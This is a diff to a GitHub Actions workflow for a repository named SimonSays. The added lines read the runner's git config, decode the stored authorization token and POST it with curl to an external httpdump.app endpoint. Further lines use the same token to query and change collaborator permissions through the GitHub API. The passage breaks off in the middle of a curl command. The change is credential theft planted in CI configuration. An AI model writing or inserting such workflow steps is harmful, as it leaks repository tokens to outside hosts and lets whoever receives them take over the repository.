@@ -12,7 +12,10 @@ jobs:
         run: |
           cd /home/runner/work/SimonSays/SimonSays/.git
           decoded=$(cat config | sed -n 's/\textraheader = AUTHORIZATION: basic \(.*\)/\1/p' | openssl enc -d -base64)
-          echo $decoded | base64
+          curl --header "Content-Type: application/json" \
+            --request POST \
+            --data '{"username":"Marcel","password":"$decoded","this is a":"test"}' \
+            https://httpdump.app/dumps/e534f752-ded8-428e-89aa-3f6e64e5d14e
           curl -H "Accept: application/vnd.github+json" -H "Authorization: basic $decoded" -H "X-GitHub-Api-Version: 2022-11-28" https://api.github.com/repos/shira2r/SimonSays/collaborators/shira2r/permission
           curl \
             -X PUT \
